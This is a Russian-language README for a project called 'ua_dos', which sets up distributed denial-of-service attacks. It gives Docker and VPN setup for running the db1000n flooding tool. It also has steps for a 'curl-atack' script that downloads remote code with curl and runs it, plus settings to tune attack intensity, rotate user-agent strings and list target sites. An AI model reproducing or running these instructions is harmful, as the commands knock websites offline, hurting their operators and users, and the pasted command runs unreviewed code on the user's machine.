# ua_dos
## Docker
Внутри докера запускается pptp vpn соединение и бинарник db1000n проекта https://github.com/Arriven/db1000n.
Нужно создать файлы конфигурации pptp в директории: `ansible/confign/files/vpn1...*` и файл паролей `ansible/confign/files/chap-secrets`.
Пример файла vpn1:
```
pty "/usr/sbin/pptp hostvpn1 --loglevel 0 --nolaunchpppd"
lock
noauth
nobsdcomp
nodeflate
name uservpn1
remotename vpn1
ipparam vpn1
persist
maxfail 0
holdoff 10
```
Здесь задаются: `hostvpn1` - IP адрес, или домен vpn сервера; `uservpn1` - имя пользователя pptp подключения; `vpn1` - названия vpn подключения.

Пример файла chap-secrets:
```
# Secrets for authentication using CHAP
# client        server  secret                  IP addresses
uservpn1 vpn1 "passwordvpn1" *
...
uservpn* vpn* "passwordvpn*" *
```
Здесь задаются:`uservpn1` - имя пользователя pptp подключения;`passwordvpn1` - пароль pptp подключения; `vpn1` - названия vpn подключения.

При сборке image эти файлы забираются внутрь.

Собирается image командой:
```
docker image build --force-rm -t ua_dos:0.1 .
```
После чего нужно создать network ipvlan типа:
```
docker network  create -d ipvlan --subnet=192.168.0.0/24 -o parent=wlo1 gwnet
```
Здесь `192.168.0.0/24` - сеть, которую раздает wifi роутер (С помощью которой хостовая машина подключена к интернету); `wlo1` - название wifi интерфейса в ноутбуке (На котором выше описаная сеть от роутера); `gwnet` - название новосозданной сети docker.
Эту информацию можно посмотреть в выводе команды `ifconfig` на хостовой машине (В данном случае ноутбук).

Запуск контейнера можно осуществлять двумя способами:
 1. В интерактивном режиме:
```
docker run --name node1 --privileged --net=gwnet --ip 192.168.0.2 -it ua_dos:0.1 vpn1
```
 2. В режиме демона:
```
docker run --name node2 --privileged --net=gwnet --ip 192.168.0.3 -d ua_dos:0.1 vpn1
```
Где `vpn1` - название vpn подключения, которое будет инициировано при запуске контейнера. `--ip 192.168.0.3` - IP адрес который будет присвоек запускаемому контейнеру (Должен быть из ранее созданной сети `--subnet=192.168.0.0/24`)
Настроить проброс ssh пока не получилось.

## Legacy
Атака `ntct` заброшена, с `curl-atack` можно работать.

1. Создай файл с любым названием *(Например: "curl-atack")*.
2. Запиши в файл две строки:
```
#!/bin/bash
source <(curl -Ls https://raw.githubusercontent.com/bro2020/ua_dos/main/curl-atack)
```
3. Сделай файл исполняемым, выполнив команду:
```
chmod +x "название файла"
(Например: chmod +x curl-atack)
```
4. Запусти файл:
```
./"название файла"
(Например: ./curl atack)
```
Загрузка таргетов пошла, через несколько секунд отобразится информация, которая будет обновляться.

Для остановки на клавиатуре зажать `Ctrl+C`. При этом завершаться **ВСЕ** процессы curl запущенные в операционной системе!

Если хочешь переопределить параметры, для увеличения/уменьшения интенсивности и увеличения/уменьшения нагрузки на оборудование ...

1. Создай файл `curl-atack-env.txt`
2. Запиши в него следующие строки:
```
rcount=$((RANDOM%10+7)) # количетво итераций, после которого принудительно завершаются процессы curl
sq1=$((RANDOM%3+1)) # количество параллельно выполняемых циклов
sq2=$((RANDOM%3+2)) # количество прогонов в каждом из параллельных циклов (1 итерация)
t1=$((RANDOM%7+7)) # таймают перед принудительным завершением процессов curl)
t2=$((RANDOM%2+1)) # таймаут(скорость) запуска проходов в параллельно выполняемых циклах
t3=$((RANDOM%3+1)) # таймаут после завершения всех проходов в параллельных циклах
t4='15' # таймаут автоматического непрерывного завершения процессов curl в каждом проходе

UA1='Mozilla/5.0 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'
UA2='Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'
UA3='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'
UA4='Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.78 Mobile Safari/537.36'
UA5='Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
```
3. Меняй их по вкусу. Сюда же можно вписать свои таргеты в виде задания переменных:
```
H1='http://target.ru'
...
H50='https://target.ru'
```
